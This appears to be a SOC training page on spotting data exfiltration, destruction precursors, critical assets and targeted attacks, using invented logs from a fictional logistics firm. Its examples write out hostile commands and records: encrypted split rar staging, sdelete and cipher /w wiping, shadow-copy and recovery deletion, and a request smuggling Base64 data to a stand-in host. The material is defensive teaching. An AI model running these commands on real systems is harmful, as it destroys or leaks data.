The previous page said which alerts are dangerous; this one shows what those situations actually look like in your data, so you can recognise them in a queue. First data exfiltration: thinking like the attacker about every step it needs (access, staging, a way out, preparation, upload), then the clues each step leaves — DNS tunnelling in Zeek dns.log, long or heavy connections in conn.log, password-protected split archives in 4688 events, bursts of outbound firewall denies, DLP and UEBA alerts, cloud-storage uploads and URLs with long unexplained parameters in proxy logs — every sample read field by field. Then data destruction: the early-warning signs (compromised patch and deployment servers, privileged accounts, unexpected Group Policy changes in 5136, secure-deletion tools such as sdelete, cipher /w, shred, raw-disk drivers in 7045 and Sysmon 6, known wiper families). Then sensitive hosts, users and data: why pre-classification beats guessing, how SIEM lookups and enrichment put criticality into the alert, and what to check by hand (an Active Directory lookup read line by line). Finally the signs of a targeted attack — indicators unknown to every open source, one-of-a-kind files, attack files and pages customised for your company, well-researched phishing, hands-on-keyboard tooling — with an opportunistic-vs-targeted comparison. Practice questions with explanations at the end.

Labels

[Supplement] = practical material you need to know, [Correction] = a commonly repeated claim that is wrong or outdated, [Changed]/[Caution] = what has changed recently and what is risky to do the old way. The company (Kestrel Logistics), hostnames, accounts, domains, IPs and log lines are invented for illustration (.example, documentation and private IPs).

docs.title: The 8 key points
docs.text:
1. Exfiltration is the last step of a long chain: access the data → stage it where it can leave → find a way out → prepare it (compress, encrypt, split) → upload it. Each step can leave evidence, so you can catch the preparation as well as the transfer.
  2. Classic exfiltration clues: high-volume DNS to one domain (tunnelling), large or long-running connections from an unusual source to an odd destination, compressed archives created from the command line (especially with passwords or split volumes: 7z -p -v, rar -hp -v), many outbound firewall denies on different ports from one host, DLP/UEBA alerts, uploads to cloud storage, and URLs with long unexplained (often Base64-like) parameters.
  3. Destruction is harder to catch early, so decide how it would happen in your environment and set early-warning alerts for those routes: compromised patch/deployment servers, compromised high-privilege accounts, unrecognised GPO changes, secure-deletion or raw-disk tools, and known wiper families.
  4. Secure-deletion tools (sdelete, cipher /w on Windows; shred, wipe, srm on Linux) are rarely run by normal users from a command line, so alerts on them are low-noise — and drivers that give raw disk access (used by several wipers to bypass NTFS permissions) are visible as driver loads and service installs.
  5. The best way to know an alert touches something sensitive is pre-classification: critical hosts, admins and sensitive data are listed in advance, and the alert itself says "on critical system". Ideally the list is updated automatically from asset inventory and Active Directory.
  6. If the alert doesn't carry it, enrich at triage time: look up the user, the host and the data first. Even naming conventions (KL-DC01, KL-FIN-DB01) and job titles ("chief engineer", "help desk" — both high-value for different reasons) change the priority.
  7. Targeted attack tells: indicators that match public reporting on a known group, domains or files unknown to every open source, files seen once in the whole world, malware a vendor names as an advanced family, your own logo, names or infrastructure inside the attack files or pages, phishing that shows inside knowledge, and hands-on actions (remote-access tools, quick lateral movement, signed malware, zero-days, look-alike domains, cloned pages).
  8. Rarity is the common thread: opportunistic campaigns are loud and quickly documented by the community; targeted ones are quiet and unique. "Nobody has ever seen this" is a warning, not a reassurance.

docs.title: Why this matters in a SOC
docs.text:
Knowing that "exfiltration is near completion" is useless if you can't recognise exfiltration when the alert in front of you says DNS - excessive query length or Proxy - long URI parameter. Alert titles are written by rule authors and describe symptoms, not intentions. Triage means mapping those symptoms back to the situations that matter: data leaving, data about to be destroyed, a crown jewel being touched, a determined attacker at work.

This page is that mapping. For each situation we ask "if I were the attacker, what would I have to do in this environment, and what would each action leave behind in our logs?" — then look at what those traces actually look like. The same thinking works in reverse for detection engineering: every clue below is also a candidate alert you can build.

docs.title: Think like the attacker first
docs.text:
Put on the attacker's hat. You want the shipment database out of Kestrel Logistics. What has to happen?

  1. Access the data. You need an account or a process that can read it — so there may be unusual logons (4624/4672) or file and database access first.
  2. Stage it. Data rarely leaves directly from the database server; it gets copied to a host that can reach the internet, or into a working folder.
  3. Find a way out. What does the firewall allow? Is there a proxy? Is DNS the only thing that leaves freely? You may probe.
  4. Prepare it. Compress it (smaller, faster), encrypt or password-protect it (so DLP and proxies can't read it), split it (smaller pieces dodge size limits and are easier to retry).
  5. Upload it. Over the C2 channel, to cloud storage, over DNS, or hidden in ordinary-looking web requests.

Exfiltration is a late-stage activity, so by the time it happens many earlier steps have happened too. You might catch any of them — or the preparation and transfer themselves. Map your own controls and visibility against these five steps and you know which ones you would see.

docs.title: The clues, and where each one shows up
docs.text:
Clue Which step Where it shows up ATT&CK High-volume DNS with long random subdomains to one domain Upload (or C2) DNS server logs, Zeek dns.log, passive DNS T1071.004, T1048 Large upload or very long connection from an unusual source to an odd destination Upload NetFlow, Zeek conn.log, firewall, proxy T1041, T1048 Archive created from the command line, with password or split volumes Prepare 4688 / Sysmon 1, EDR T1560.001 Many outbound denies on different ports from one source Find a way out Firewall logs (egress probing before T1048) DLP or UEBA alerts Access, stage, upload DLP console, UEBA — Upload to file-sharing or cloud storage, or a sync tool appearing Upload Proxy, CASB, EDR T1567.002 URLs with long unexplained, Base64-looking parameters Upload Proxy logs, Zeek http.log T1041, T1132.001

Each one below.

docs.title: High-volume DNS tunnelling
docs.text:
DNS tunnelling encodes data into the names being looked up. Because every network lets DNS out (somewhere), it is a favourite way out when everything else is blocked. A Zeek dns.log excerpt (columns trimmed):

ts                  id.orig_h     query                                                         qtype_name  rcode_name
1764141601.104512   10.20.4.112   mzxw6ytboi2dqnrrge3tmmjq.gm4tqojrgy3dkmbqgu.t.kl-cdn.example   TXT         NOERROR
1764141601.211873   10.20.4.112   nfxgg5bamjzgk3tf.hjswy3dpebwgk4tt.mfsgc4tf.t.kl-cdn.example    TXT         NOERROR
1764141601.318020   10.20.4.112   onsxe5tjmnswk.zlomvzgc3tj.nzswk5dj.t.kl-cdn.example             TXT         NOERROR
  • ts — Unix timestamps about 0.1 s apart. A person browsing does not resolve a new unique name ten times a second.
  • id.orig_h 10.20.4.112 — the internal host asking. (This is KL-WS-0412 from the previous page.)
  • query — the left-hand labels (mzxw6ytboi2d…) are Base32-looking gibberish, long and never repeated. Real hostnames are short and repeat. The data is in these labels: the attacker controls the authoritative server for t.kl-cdn.example, so every query arrives there and is decoded.
  • qtype_name TXT — TXT records can carry arbitrary text back, which tunnelling tools use for the return channel. A workstation asking for thousands of TXT records is very unusual.
  • rcode_name NOERROR — the attacker's server is answering, so the channel works.

A quick count makes the volume obvious:

$ cat dns.log | zeek-cut id.orig_h query | awk '{n=split($2,a,"."); print $1, a[n-2]"."a[n-1]"."a[n]}' | sort | uniq -c | sort -rn | head -3
  18342 10.20.4.112 t.kl-cdn.example
    911 10.20.4.37  corp.kestrel.example
    402 10.20.4.112 corp.kestrel.example
  • zeek-cut id.orig_h query — print just those two columns from the log.
  • awk '{…}' — split the query on dots and keep only the last three labels (the zone the data is being sent to), printed after the client IP.
  • sort | uniq -c | sort -rn | head -3 — count identical lines, most frequent first.
  • Result: 18,342 queries from one workstation to one external zone, twenty times more than its lookups for the company's own domain. That is tunnelling, not browsing (more in DNS abuse).

docs.title: Large or long connections to odd destinations
docs.text:
Bulk transfer leaves a shape in flow data. A Zeek conn.log line:

ts                 id.orig_h     id.resp_h      id.resp_p  proto  service  duration    orig_bytes    resp_bytes  conn_state
1764142010.55201   10.30.8.21    203.0.113.88   443        tcp    ssl      14512.31    9663427810    1840233     SF
  • id.orig_h 10.30.8.21 — the source: a server in the finance range, not a user PC. Servers usually receive connections; a server initiating a big outbound transfer is unusual.
  • id.resp_h 203.0.113.88, id.resp_p 443, service ssl — an external host on HTTPS. The content is encrypted, so you judge by shape and destination.
  • duration 14512.31 — about 4 hours of one continuous connection.
  • orig_bytes 9663427810 — about 9.7 GB sent from inside to outside. Note the direction: orig_bytes is what the originator (our server) sent.
  • resp_bytes 1840233 — only 1.8 MB came back: acknowledgements, not downloads. Upload-heavy ratio = data leaving.
  • conn_state SF — the connection set up and closed normally: the transfer finished.

Next step: pivot to the proxy or TLS logs (Zeek ssl.log: what server name, which certificate?) and to the destination's reputation. Remember that legitimate file-sharing services make excellent exfiltration points precisely because they are trusted and allowed; unless they are against policy, they don't stand out.

docs.title: Archives built from the command line
docs.text:
Most people zip files by right-clicking. Attackers use command-line archivers, and the flags give them away:

Event ID 4688  Computer: KL-FS02   2026-11-24 04:02:55
  Creator Subject:     AccountName svc_backup
  New Process Name:    C:\Users\Public\Music\rar.exe
  Creator Process:     C:\Windows\System32\cmd.exe
  Process Command Line: rar.exe a -hpLogistix2026 -m5 -v500m -r C:\Users\Public\Music\m.rar \\KL-FIN-DB01\D$\Exports\
  • 4688 = "A new process has been created" (Security log, when process-creation auditing is on; Sysmon event 1 is the richer equivalent). Attackers care because every tool they launch writes one, which is why many try to run from memory or through trusted binaries.
  • New Process Name C:\Users\Public\Music\rar.exe — the command-line RAR tool, from a world-writable folder nobody installs software into.
  • a = add to archive. -hp<password> = encrypt file contents and headers with that password (so even the file names inside are hidden from DLP). -m5 = maximum compression. -v500m = split into 500 MB volumes. -r = recurse into subfolders.
  • \\KL-FIN-DB01\D$\Exports\ — the source is an administrative share on the database server: data being pulled across the network into a staging folder.
  • ATT&CK T1560.001 Archive Collected Data: Archive via Utility and T1074.001/.002 Data Staged (local / remote).

Because ordinary users almost never run archivers with password and split flags from a command line, an alert on 7z/rar/winrar with -p, -hp or -v is a low-volume, high-value detection.

docs.title: Many denied ports from one source
docs.text:
An attacker who doesn't know the firewall rules will try several ports until one works:

2026-11-24T03:55:01 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=8080 proto=tcp
2026-11-24T03:55:02 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=8443 proto=tcp
2026-11-24T03:55:02 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=21   proto=tcp
2026-11-24T03:55:03 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=22   proto=tcp
2026-11-24T03:55:03 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=53   proto=udp
2026-11-24T03:55:04 KL-FW01 action=allow src=10.20.4.112 dst=198.51.100.9 dport=443 proto=tcp
  • Same src and same dst, one port after another, a second apart: an automated "which way out is open?" test (some tools do exactly this, and so do some C2 implants with fallback ports).
  • action=allow … dport=443 — the last line is the one that matters: the attacker found the open path. Now look at what went over it.
  • One denied connection means nothing. Many different ports to the same destination from one internal host in seconds is the pattern.

docs.title: DLP and UEBA alerts
docs.text: Data loss prevention (DLP) tools inspect content (on the endpoint, in email, in the proxy) for sensitive patterns or labels. User and entity behaviour analytics (UEBA) builds a baseline per user and host and alerts when behaviour departs from it ("svc_backup read 40× its normal data volume"). Individually these alerts are often noisy. Their value in triage is stacking: one internal source collecting several alerts — "sensitive data accessed", "unusual volume", "archiving command line" — is the picture of collection and staging (DLP and UEBA).

docs.title: Cloud storage and sync tools
docs.text:
2026-11-24 04:31:12 10.20.4.112 j.moreno CONNECT g.api.mega.example:443 200 TCP_TUNNEL 512334992 "rclone/v1.6x"
  • CONNECT g.api.mega.example:443 — an HTTPS tunnel to a cloud-storage API host.
  • 512334992 — about 512 MB sent through the tunnel.
  • "rclone/v1.6x" — the User-Agent of rclone, a legitimate command-line sync tool that is widely abused for exfiltration because it speaks to dozens of cloud providers. A logistics clerk does not normally run it.
  • ATT&CK T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage.

docs.title: URLs with long, unexplained parameters
docs.text:
Data can be smuggled out in ordinary-looking GET requests:

GET /index/__utm.gif?cookie=UmVwb3J0X1EzLmNzdjtjbGllbnRzPTQxMjt0b3RhbD04ODMyMTA=&r=482 HTTP/1.1
Host: stats.kl-metrics.example
  • /index/__utm.gif — dressed up as an analytics tracking pixel, which everybody's browser requests constantly.
  • cookie=UmVwb3J0X1Ez… — a long value made only of letters, digits and maybe +/=: Base64. Real analytics parameters are short IDs or readable names. Decode it safely (echo '…' | base64 -d) and this one reads Report_Q3.csv;clients=412;total=883210 — file data being sent out.
  • One such request is nothing; hundreds of requests with different long values to the same host is a channel (Base64). ATT&CK T1132.001 Data Encoding: Standard Encoding over T1041 Exfiltration Over C2 Channel.

docs.title: Plan for it before it happens
docs.text: Destruction (ransomware encryption, wipers) is fast, and once it starts the window is small. Catching it before it starts is hard but sometimes possible — if you have thought about how it would be done in your environment and placed early warnings on those routes. Ask: "if someone wanted to break every computer here at once, how would they push the payload out?"

docs.title: The early-warning signs
docs.text:
• Compromise of patching or software-deployment servers. The system that can install software on every machine can also install a wiper on every machine (T1072 Software Deployment Tools). Unusual logons to, or new packages on, these servers deserve top priority.
  • Compromise of high-privilege accounts. Mass destruction needs mass access: domain admins, deployment service accounts, hypervisor admins.

  • Unrecognised Group Policy changes. A GPO that creates a scheduled task or startup script on every computer is a classic way to run a payload everywhere (T1484.001 Domain or Tenant Policy Modification: Group Policy Modification). With directory-service change auditing on, the domain controller writes 5136 ("A directory service object was modified"):

    Event ID 5136  Computer: KL-DC01   2026-11-24 05:10:44
  Subject:    AccountName svc_backup
  Object:     DN CN={6B2F…},CN=Policies,CN=System,DC=corp,DC=kestrel,DC=example
              Class groupPolicyContainer
  Attribute:  LDAP Display Name gPCMachineExtensionNames
  Operation:  Type Value Added
    • 5136 fires on a domain controller when an Active Directory object's attribute changes. Here the object class is groupPolicyContainer — a GPO.
    • gPCMachineExtensionNames changing means new kinds of computer settings (for example scheduled tasks or scripts) were added to the policy.
    • AccountName svc_backup — a backup service account editing Group Policy is not normal administration. Attackers care about GPOs because one edit reaches every machine the policy applies to at the next refresh.

  • Use of secure-deletion or raw-disk tools.

    Process Command Line: sdelete64.exe -accepteula -p 3 -s -q D:\Exports\
Process Command Line: cipher.exe /w:D:\
    • sdelete (Sysinternals): -p 3 overwrite three times, -s recurse into subfolders, -q quiet, -accepteula suppress the licence prompt (a tell of unattended, scripted use).
    • cipher /w:D:\ — a built-in Windows tool; /w overwrites free space on the drive so deleted files can't be recovered.
    • On Linux, alert on shred, wipe and srm in process or audit logs (for example an auditd EXECVE record with a0="shred" a1="-n" a2="3" a3="-u").
    • Normal users almost never run these from a command line, so false positives stay low. ATT&CK T1485 Data Destruction, T1070.004 File Deletion when used to cover tracks.

  • Drivers that give raw disk access. Several wipers have loaded a legitimate, signed third-party driver that reads and writes the disk directly, sidestepping NTFS permissions (the 2012 Shamoon attacks and the 2014 Destover attack on a film studio both used a commercial raw-disk driver; in 2022 a wiper abused a partition-manager driver). A new kernel driver shows up as 7045 in the System log ("A service was installed in the system", with Service Type: kernel mode driver) and as Sysmon event 6 ("Driver loaded"), which records the driver's path, hashes and signature. An unexpected kernel driver on a server — especially one signed by a disk-utility vendor you don't use — is an early warning (T1561 Disk Wipe, T1014 Rootkit / T1068 when vulnerable drivers are abused).

  • Known wiper or ransomware family detected. If antivirus or EDR names a family known for destruction, or reports worm-like spreading, ring the alarm immediately — even if the first instance was blocked.
  • [Supplement] Recovery being removed. Shadow-copy deletion (vssadmin delete shadows /all /quiet, wmic shadowcopy delete), bcdedit /set {default} recoveryenabled no and attacks on backup consoles (T1490 Inhibit System Recovery) usually come minutes before encryption.

docs.title: Spotting sensitive hosts, users and data
The best way: classify in advance
docs.text:
How do you know an alert involves a critical host, a key person or sensitive data? The best answer is that somebody decided it before the alert fired, and the alert says so. Compare:

Exploit attempt: SMB remote code execution → 10.30.8.21
Exploit attempt: SMB remote code execution → 10.30.8.21 [CRITICAL ASSET: KL-FIN-DB01, tier-0 data, owner Finance]

The second version needs no thinking. To produce it, the SIEM looks up each entity in a list of critical assets and identities when the alert is created and raises the priority on a match. That only works if:

  • the list exists and updates itself — fed from the asset inventory/CMDB and from Active Directory (members of Domain Admins, accounts with adminCount=1, the Executives group, servers in the Tier0 OU) rather than a spreadsheet someone last edited two years ago;
  • the organisation actually knows where its sensitive data lives and who can reach it — a problem many struggle with long before the SOC gets involved.

A simple SIEM lookup file might look like:

host,ip,criticality,owner,notes
KL-DC01,10.10.0.10,tier0,IT-Identity,domain controller
KL-FIN-DB01,10.30.8.21,tier0,Finance,shipment and billing database
KL-OT-HMI03,10.90.3.13,tier0,Warehouse-OT,conveyor HMI - change window Sun 02:00
KL-WS-0388,10.20.4.88,low,Facilities,lobby kiosk

Each column is something triage needs: how critical, who owns it (who to call), and notes such as the maintenance window (an unsigned driver loaded on KL-OT-HMI03 during the Sunday change window is a different story from one at 08:30 on a Tuesday).

docs.title: When the alert doesn't tell you: enrich
docs.text:
If criticality isn't in the alert, the next best thing is automatic enrichment when you open it (most alert-handling and SOAR tools can do this). At a minimum, looking up the user, the asset and the data is your first triage step. A quick Active Directory lookup:

PS> Get-ADUser j.moreno -Properties Title,Department,Manager,MemberOf,adminCount |
      Select-Object SamAccountName,Title,Department,adminCount,@{n='Groups';e={$_.MemberOf -replace '^CN=([^,]+).*','$1'}}

SamAccountName : j.moreno
Title          : Help Desk Analyst
Department     : IT Service Desk
adminCount     : 1
Groups         : {Helpdesk-L2, Workstation-Admins, VPN-Users}
  • Get-ADUser j.moreno — fetch the user object; -Properties … asks for attributes that aren't returned by default.
  • Select-Object … — show only the useful fields; the @{n='Groups';e={…}} part is a calculated column that strips each group's distinguished name down to its common name.
  • Title: Help Desk Analyst — help-desk staff look junior but often hold broad rights (password resets, admin on every workstation). Compromise of such an account is high-value for an attacker — just as "chief engineer" is high-value for the data they can reach.
  • adminCount: 1 — this account is or was in a protected administrative group. Treat as privileged.
  • Workstation-Admins — local admin on all workstations: an attacker holding this account can move laterally almost anywhere.

Even without tools, naming conventions carry context: KL-DC01 (domain controller), KL-FIN-DB01 (finance database), KL-OT-… (operational technology). A good naming standard is a free enrichment source.

docs.title: Targeted attack identification
docs.text:
Targeted attackers are the "advanced or targeted" category of danger. They won't announce themselves, but some clues point to an attacker who chose you or who is more capable than average:

Area Tell Why it suggests a targeted or capable attacker Specific IOCs Domain, IP or hash matches a public report on a known advanced group The easy case: someone has already done the attribution work Domain or URL unknown to every open source (URL scanners, reputation services, passive DNS) Mass campaigns are submitted to community services within hours; total absence suggests infrastructure built for few victims Files Malware never seen anywhere before (AV/EDR cloud reputation: prevalence 1) Commodity malware is everywhere; a one-of-a-kind file was likely built for you Vendor names the file as a family associated with advanced groups Strong signal; move quickly Interactive post-exploitation tools (C2 frameworks, credential dumpers) Someone is at the keyboard, not an automated bot Files customised to you: your company name, internal hostnames or domain in strings or config Someone spent effort tailoring the attack Email A well-tailored lure to one specific person Research into who does what Inside knowledge: internal project names, real colleagues, real processes Prior reconnaissance or a prior compromise Actions Installation of remote-access tooling (T1219) Persistent, interactive access Lateral movement soon after initial compromise A human pursuing a goal inside your network High-quality signed malware (T1553.002) Stolen or bought code-signing certificates cost money and effort Zero-day exploits (T1203, T1190) Expensive; not wasted on random targets Look-alike domains and cloned pages of your own sites (T1583.001, T1566.002) Built for your users specifically

About file rarity: a former head of the NSA's offensive hacking unit once gave defenders this advice in a public talk (paraphrased): if your reputation service tells you an executable has been seen exactly once in the history of the Internet — and that once is on your machine — you should be very worried. That is the same logic as the "lowest count" rule from the previous page, applied to the whole world instead of your SIEM.

docs.title: Opportunistic vs targeted: a side-by-side
docs.text:
Two invented phishing alerts from the same morning:

Alert P1 Alert P2 Recipients 2,300 mailboxes across many companies (shared blocklist hit) 1 mailbox: r.ito, head of warehouse automation Lure "Your parcel could not be delivered" "Conveyor PLC firmware 4.2 — vendor change notice for the Sunday window", signed with a real vendor contact's name Link hxxps://parcel-track-update.example/… — 214 submissions on URL-scanning services, 9 days old hxxps://kestrel-ot-portal.example/notice — no results anywhere; registered 3 days ago; page is a pixel-perfect clone of Kestrel's supplier portal with the Kestrel logo Attachment None PLC_notice.pdf.lnk — hash prevalence 1 in the EDR cloud; strings contain KL-OT-HMI Verdict Opportunistic. Block, purge, normal priority. Targeted. Inside knowledge (maintenance window, OT naming), unique infrastructure and file, customised to Kestrel. Raise to the top and tie to the A8 driver alert on KL-OT-HMI03 from the previous page.

docs.title: The 2026 view
docs.text:
[2026 Current] Still valid

The approach is unchanged: model how exfiltration or destruction would have to happen in your environment, alert on each step, and stack weak signals from one source. The concrete clues still work — DNS tunnelling volume, upload-heavy long connections, command-line archivers with password and split flags, egress probing in firewall logs, Base64-looking parameters, secure-deletion tools, unexpected kernel drivers (7045, Sysmon 6), GPO changes (5136) and shadow-copy deletion. Pre-classified critical assets and identities, and enrichment at triage time, remain the way to know what is sensitive. Rarity — unknown to open sources, prevalence of one — is still one of the best tells of a targeted attack.

[Changed] What has changed

  • Theft often replaces encryption. Industry reporting since 2024 describes a large share of extortion attacks that steal data without encrypting it, and Mandiant's M-Trends 2026 describes "recovery denial" — operators going after backups, identity services and hypervisors. Exfiltration signs are now often the main event, not a prelude.
  • Exfiltration rides trusted services. Cloud-storage APIs and sync tools (rclone and similar), SaaS file sharing, and direct theft from SaaS tenants with stolen tokens are now common. Much of this never touches your proxy; you need cloud and SaaS audit logs (and CASB) as well.
  • Less DNS visibility. DNS over HTTPS and encrypted DNS can hide tunnelling from classic DNS logs unless you force clients to your resolvers (encrypted DNS).
  • Destruction through management planes. Recent wipers still use raw-disk access and vulnerable signed drivers (BYOVD), but reporting in 2025–26 also describes attackers abusing legitimate device-management and cloud consoles to wipe or reset devices at scale, which leaves traces in those consoles' audit logs rather than in endpoint process events. Treat admin access to MDM, backup and virtualisation consoles as a destruction route.
  • Built-in criticality. XDR and exposure-management platforms now let you tag critical assets and identities and feed that into incident priority; identity platforms expose privileged-role membership directly. The principle is the same — the list must still be correct.
  • ATT&CK v19/v20. The tactics used here (Collection, Exfiltration TA0010, Impact TA0040) and techniques (T1560.001, T1567.002, T1048, T1041, T1485, T1490, T1561, T1484.001, T1072) keep their IDs; since v19 (April 2026) defence-evasion techniques are split between Stealth (TA0005) and Defense Impairment (TA0112).

[Caution] Wrong or risky to do the old way

  • "Well-written and personalised" no longer proves targeting. Industry reports in 2025–26 describe AI-written phishing as the baseline: fluent, tailored lures are now cheap at scale. Weigh inside knowledge (internal names, real processes, real timing) and unique infrastructure far more than polish.
  • "Unknown to OSINT" is not proof either. Brand-new opportunistic infrastructure is also unknown for its first hours. Combine rarity with other tells.
  • Don't submit a possibly targeted URL or file to public scanners just to check rarity: the attacker may watch for it, and you may leak data. Search for existing results first; use private analysis (analysis OPSEC).
  • Don't assume encrypted traffic hides everything. Direction, volume, duration and destination in conn.log still reveal bulk exfiltration.
  • Don't treat backup and deployment servers as "IT plumbing". They are top destruction routes and belong on the critical-asset list.

docs.title: Question 1
docs.text:
A UEBA alert says svc_reports read 30 times its normal volume from the HR share overnight. In the same hour, EDR shows 7z.exe a -p -v100m on the same server, and the firewall shows twelve denied outbound connections on different ports from that server, then one allowed on 443. What is happening, which exfiltration steps do you see, and what do you check next?

Answer and explanation

This is very likely data collection, preparation and exfiltration in progress — a near-completion situation that goes to the top of the queue.

  • UEBA volume spike = access to the data (and possibly staging).
  • 7z a -p -v100m = preparation: password-protected (hides contents from DLP), split into 100 MB volumes. T1560.001.
  • Many denies on different ports then an allow on 443 = finding a way out (egress probing), and the found path.

Next: in conn.log/proxy, look at the allowed 443 connection's duration, orig_bytes vs resp_bytes and the destination (TLS server name, reputation, cloud storage?); check where the archive volumes are and whether they still exist; check how svc_reports logged on (4624/4672, from where). Contain according to your procedures.

docs.title: Question 2
docs.text:
Name four early-warning signs of a destructive attack and the log source or event that would show each.

Answer and explanation

Any four of:

  • Compromised patch/deployment server (T1072) — unusual logons (4624/4672) on the server, new packages or jobs in the deployment tool's logs.
  • Compromised high-privilege account — 4624/4672 for admin accounts on unusual hosts, 4768/4769 Kerberos activity at odd times.
  • Unrecognised GPO change (T1484.001) — 5136 on domain controllers with object class groupPolicyContainer.
  • Secure-deletion tools — 4688/Sysmon 1 with sdelete, cipher /w; auditd/EDR on Linux for shred, wipe, srm (T1485).
  • Raw-disk drivers — 7045 (kernel-mode driver service installed) and Sysmon 6 (driver loaded) for an unexpected signed driver (T1561).
  • Known wiper/ransomware family — antivirus/EDR detection names, worm-like spreading alerts.
  • Recovery removal — vssadmin delete shadows, bcdedit … recoveryenabled no (T1490).

docs.title: Question 3
docs.text:
An alert reads "Malicious LNK executed on WS-2231, user k.sato". Nothing in it says whether this is important. What do you look up first, and which findings would make you suspect a targeted attack?

Answer and explanation

First look up the user (title, department, privileged groups, adminCount), the host (naming, asset list criticality, owner) and, if any, the data the user can reach. A "chief engineer", an executive, finance staff who can move money, or a help-desk account with admin rights on all workstations all raise the priority.

Targeted-attack tells to check: the LNK's hash prevalence (seen once worldwide?), whether vendors name it as an advanced family, whether its strings or the payload's configuration contain your company or hostnames, how it arrived (a tailored email to this one person with inside knowledge?), whether the domains it contacts are unknown to every open source or are look-alikes of your own, and whether the follow-on actions are hands-on (remote-access tools, quick lateral movement).
